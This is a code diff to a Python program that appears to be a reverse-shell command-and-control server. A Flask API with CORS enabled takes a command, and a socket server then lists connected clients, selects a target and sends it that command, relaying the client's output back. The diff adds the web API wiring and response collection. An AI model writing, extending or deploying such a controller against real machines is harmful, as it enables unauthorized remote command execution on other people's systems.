@@ -4,6 +4,7 @@ from queue import Queue
 import time
 from flask import Flask
 from flask_restful import Api, Resource, reqparse, marshal_with, fields
+from flask_cors import CORS
 
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
@@ -15,6 +16,7 @@ current_conn = []  # hold the conn to use for start_turtle
 # wrap everything with an api
 app = Flask(__name__)
 api = Api(app)
+CORS(app)  # enable cross origin resources sharing
 
 commands_args = reqparse.RequestParser()
 commands_args.add_argument(
@@ -29,17 +31,17 @@ resource_fields = {
 
 
 class Commands(Resource):
+    # @app.route("/", methods=["POST"]) not required as api already handle methods
     @marshal_with(resource_fields)
     def post(self):  # make commands to the clients
         data = commands_args.parse_args()
         cmd = data['cmd']
         # create a thread to receive data and start sending commands to the client
-        t = threading.Thread(target=start_turtle(cmd))
-        t.daemon = True  # stop running when the program stops
-        t.start()
+        start_turtle(cmd)
         stat = get_status()
         return {"cmd": f"{cmd}", "status": f"{stat}"}
 
+    # @app.route("/", methods=["GET"])
     @marshal_with(resource_fields)
     def get(self):  # get current status
         stat = get_status()
@@ -80,7 +82,9 @@ def socket_bind():
         global host
         global port
         global s
-        print(f'Binding socket to port {port}')
+        output = f'Binding socket to port {port}'
+        print(output)
+        response.append(output)
         s.bind((host, port))
         # listen allows server to accept connection, 5 the number of back connetions before refusing new connections
         s.listen(5)
@@ -115,7 +119,6 @@ def start_turtle(cmd):
     elif "select" in cmd:
         conn = get_target(cmd)
         current_conn.append(conn)
-        del response[:]
     else:
         try:
             send_target_commands(current_conn[-1], cmd)
@@ -138,7 +141,9 @@ def list_connections():
             continue
         # 0 is the ip address, 1 is the port number
         results += f"{i}   {all_addresses[i][0]}   {all_addresses[i][1]} \n"
-    print(f"---CLients---\n {results}")
+    output = f"---CLients---\n {results}"
+    response.append(output)
+    print(output)
 
 
 def get_target(cmd):
@@ -146,9 +151,12 @@ def get_target(cmd):
         target = cmd.replace("select ", "")
         target = int(target)
         conn = all_connections[target]
-        print(f"You are now connected to {str(all_addresses[target][0])}")
+        output = f"You are now connected to {str(all_addresses[target][0])}"
+        response.append(output)
+        print(output)
         # end to not create a new line
         print(f"{str(all_addresses[target][0])}>", end="")
+
         return conn
     except:
         print("Not a valid connection")
@@ -166,6 +174,7 @@ def send_target_commands(conn, cmd):
             print(client_response)
     except:
         print("Connetion was lost")
+        del response[:]
         return
 # create worker threads
 
@@ -176,7 +185,7 @@ def create_worker():
         t.daemon = True  # stop running when the program stops
         t.start()
 
-# do the next job in the queue(one handles running the api, one handles creating the socket)
+# do the next job in the queue(one handles running the api, one handles creating and maintaining the socket)
 
 
 def work():
